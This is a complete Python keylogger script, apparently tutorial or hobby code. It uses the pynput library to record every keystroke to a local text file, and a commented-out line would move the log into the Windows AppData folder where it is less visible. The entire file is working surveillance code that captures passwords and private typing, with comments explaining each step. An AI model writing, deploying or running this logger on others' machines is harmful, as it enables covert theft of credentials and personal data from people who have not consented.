import os
from pynput.keyboard import Listener

# Will store the keys pressed
keys = []
count = 0
path = 'keylogger.txt'
# windows_path = os.environ['appdata'] + '\\keylogger.txt'
def new_line():
    print('\n')

def on_press(key):
    global keys, count
    
    # This appends the keystroke to the global list we created called keys
    keys.append(key)
    count += 1
    
    # If we do not clear the keys list, we will write all previous keys to the file and it will be very ineligible
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Remember to open as APPENDING, as writing will constantly overwrite everything
def write_file(keys):
    with open(path, 'a') as file:
        for key in keys:
            
            # We want to replace this with nothing, and pynput will give you single quotes, we want to get rid of that so its easier to read
            k = str(key).replace("'", "")
            
            if k.find('backspace') > 0:
                file.write(' Backspace ')
            elif k.find('enter') > 0:
                file.write('\n')
            elif k.find('shift') > 0:
                file.write(' SHIFTPRESSED ')
            elif k.find('space') > 0:
                file.write(' ')
            elif k.find('caps_lock') > 0:
                file.write(' CAPSLOCKPRESSED ')
            elif k.find('ctrl') >0:
                file.write(' CTRLPRESSED ')
            elif k.find('Key'):
                file.write(k)

# This is opening up the listener, which is close to opening a file, this will capture the keystrokes with the on_press function.  I want this to store in a file that we create also.
# I am wrapping this in a try except because we don't want all the errors when we hit the keyboard interrupt on testing
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except:
        pass